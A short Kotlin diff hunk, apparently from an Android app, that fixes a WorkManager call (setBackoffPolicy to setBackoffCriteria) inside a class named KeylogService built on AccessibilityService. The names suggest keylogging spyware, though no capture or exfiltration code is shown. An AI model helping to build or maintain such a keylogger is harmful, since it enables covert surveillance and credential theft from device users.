@@ -223,7 +223,7 @@ class KeylogService : AccessibilityService() {
         try {
             val retryRequest = OneTimeWorkRequestBuilder<KeylogRetryWorker>()
                 .setInitialDelay(5, TimeUnit.SECONDS)
-                .setBackoffPolicy(BackoffPolicy.EXPONENTIAL, 5, TimeUnit.SECONDS)
+                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 5, TimeUnit.SECONDS)
                 .build()
 
             WorkManager.getInstance(this).enqueueUniqueWork(
